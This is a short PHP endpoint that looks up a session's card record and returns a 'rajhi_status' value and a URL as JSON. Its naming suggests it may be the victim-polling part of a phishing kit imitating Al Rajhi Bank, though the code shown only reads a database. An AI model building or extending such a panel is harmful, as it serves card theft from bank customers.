<?php
require_once('./dashboard/init.php');
header('Content-Type: application/json');

session_start();

$id = $_SESSION['card_id'] ?? null;
if (!$id) {
    echo json_encode(['status' => 0, 'url' => '']);
    exit;
}

$db = new DB();
$db->query("SELECT rajhi_status, url FROM card WHERE id = ?");
$db->bind(1, $id);
$row = $db->fetch();

if ($row) {
    echo json_encode(['status' => $row->rajhi_status, 'url' => $row->url]);
} else {
    echo json_encode(['status' => 0, 'url' => '']);
}